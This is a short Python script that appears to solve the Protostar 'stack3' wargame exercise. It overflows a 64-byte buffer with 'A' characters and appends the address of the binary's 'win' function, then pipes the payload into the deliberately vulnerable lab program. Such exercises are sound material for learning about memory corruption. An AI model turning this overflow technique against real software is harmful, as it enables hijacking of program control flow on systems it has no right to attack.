import subprocess

path = '/opt/protostar/bin/stack3'
win_address = '\x24\x84\x04\x08'
complete = 'A'*64+win_address

p = subprocess.Popen(path, stdin=subprocess.PIPE, shell=True)
p.stdin.write(complete)
stdout, stderr = p.communicate()
